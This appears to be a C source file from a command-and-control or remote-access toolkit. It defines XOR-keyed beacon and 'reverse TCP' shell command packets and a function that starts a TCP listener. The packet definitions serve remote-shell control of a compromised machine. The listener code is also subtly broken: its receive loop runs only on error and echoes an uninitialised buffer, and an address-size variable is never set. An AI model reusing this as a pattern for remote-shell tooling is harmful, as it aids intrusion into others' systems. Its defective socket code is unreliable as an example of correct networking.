/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include "../defs.h"
#include "../stub/shell.h"

#ifndef NET_BACKLOG_COUNT
#define NET_BACKLOG_COUNT 4
#endif

#ifndef NET_PACKET_MAX_SIZE
#define NET_PACKET_MAX_SIZE 1024
#endif

#ifndef NET_PACKET_BEACON
typedef struct{
  int xor_key;
  int command;
} net_packet_beacon_t;
#define NET_PACKET_BEACON 0
#endif

#ifndef NET_PACKET_CMD_REVERSE_TCP
typedef struct{
  int xor_key;
  int command;
  shell_reverse_tcp_args_t args;
} net_packet_cmd_reverse_tcp_t;
#define NET_PACKET_CMD_REVERSE_TCP
#endif

bool net_start_server(int port){
  if (port < TCP_PORT_MIN || port > TCP_PORT_MAX){
    fprintf(stderr, "error: server port is invalid\n");
    return false;
  }
  char data_client[NET_PACKET_MAX_SIZE];
  int sock_fd, sockaddr_in_size, read_size;
  struct sockaddr_in server, client;
  sock_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (sock_fd < 0){
    fprintf(stderr, "error: server could not create socket\n");
    return false;
  }
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_port = htons(port);
  if (bind(sock_fd, (struct sockaddr *)&server, sizeof(server))){
    fprintf(stderr, "error: server failed to bind to socket\n");
    return false;
  }
  if (listen(sock_fd, NET_BACKLOG_COUNT) < 0){
    fprintf(stderr, "error: server failed to listen on socket\n");
    return false;
  }
  int sock_client = accept(sock_fd, (struct sockaddr *)&client, (socklen_t*)&sockaddr_in_size);
  if (sock_client < 0){
    fprintf(stderr, "error: server failed to accept client request\n");
    return false;
  }
  while( (read_size = recv(sock_client, data_client, NET_PACKET_MAX_SIZE, 0)) < 0){
    write(sock_client , data_client , strlen(data_client));
  }
  if (read_size == 0){
    return true;
  }
  return true;
}
